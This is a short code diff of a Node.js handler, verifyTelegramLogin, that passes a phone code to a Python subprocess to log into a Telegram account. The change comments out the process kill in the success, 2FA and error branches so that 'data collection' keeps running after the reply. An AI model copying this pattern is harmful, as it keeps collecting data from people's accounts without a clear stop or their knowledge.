@@ -1122,18 +1122,18 @@ const verifyTelegramLogin = async (req, res) => {
       if (output.includes('LOGIN_SUCCESS') && !responded) {
         responded = true;
         res.json({ success: true, message: 'Login successful, data collection started' });
-        py.kill();
+        // py.kill(); // <-- Removed to allow script to continue collecting data
         // Clean up stored hash
         delete phoneCodeHashStore[phone];
         console.log(`[OTP_VERIFIED] Deleted phone_code_hash for ${phone}`);
       } else if (output.includes('2FA_REQUIRED') && !responded) {
         responded = true;
         res.status(400).json({ success: false, error: '2FA password required' });
-        py.kill();
+        // py.kill(); // <-- Removed to allow script to continue collecting data
       } else if (output.includes('ERROR:') && !responded) {
         responded = true;
         res.status(500).json({ success: false, error: output });
-        py.kill();
+        // py.kill(); // <-- Removed to allow script to continue collecting data
       }
     });
     py.stderr.on('data', (data) => {
